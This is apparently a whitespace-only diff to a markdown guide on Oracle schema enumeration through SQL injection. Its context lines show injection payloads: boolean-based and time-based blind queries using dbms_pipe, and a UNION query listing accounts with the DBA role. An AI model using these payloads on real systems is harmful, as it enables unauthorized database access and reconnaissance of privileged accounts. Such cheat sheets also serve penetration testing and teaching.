@@ -14,6 +14,7 @@ In Oracle, the concept of "database names" differs from other database managemen
 ### Oracle Database Architecture
 
 In Oracle:
+
 - A **database** is the overall Oracle instance
 - A **schema** is a collection of database objects (tables, procedures, etc.) owned by a specific user
 - By default, each user has their own schema with the same name as the username
@@ -57,11 +58,11 @@ Oracle installations include many default schemas/users:
 
 ```sql
 -- Common default schemas
-SELECT username, account_status FROM all_users 
+SELECT username, account_status FROM all_users
 WHERE username IN (
-    'SYS', 'SYSTEM', 'DBSNMP', 'SYSMAN', 'OUTLN', 'MDSYS', 
-    'ORDSYS', 'ORDPLUGINS', 'CTXSYS', 'DSSYS', 'PERFSTAT', 
-    'WKSYS', 'WMSYS', 'XDB', 'ANONYMOUS', 'ODM', 'ODM_MTR', 
+    'SYS', 'SYSTEM', 'DBSNMP', 'SYSMAN', 'OUTLN', 'MDSYS',
+    'ORDSYS', 'ORDPLUGINS', 'CTXSYS', 'DSSYS', 'PERFSTAT',
+    'WKSYS', 'WMSYS', 'XDB', 'ANONYMOUS', 'ODM', 'ODM_MTR',
     'OLAPSYS', 'TRACESVR', 'SCOTT'
 );
 ```
@@ -95,7 +96,7 @@ WHERE username IN (
 ' AND (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83--
 
 -- Time-based blind approach
-' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83 
+' AND (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM all_users WHERE ROWNUM=1)=83
      THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
@@ -202,4 +203,3 @@ SELECT * FROM v$listener_network;
 -- Find schemas with DBA role
 ' UNION SELECT grantee,NULL FROM dba_role_privs WHERE granted_role='DBA'--
 ```
-
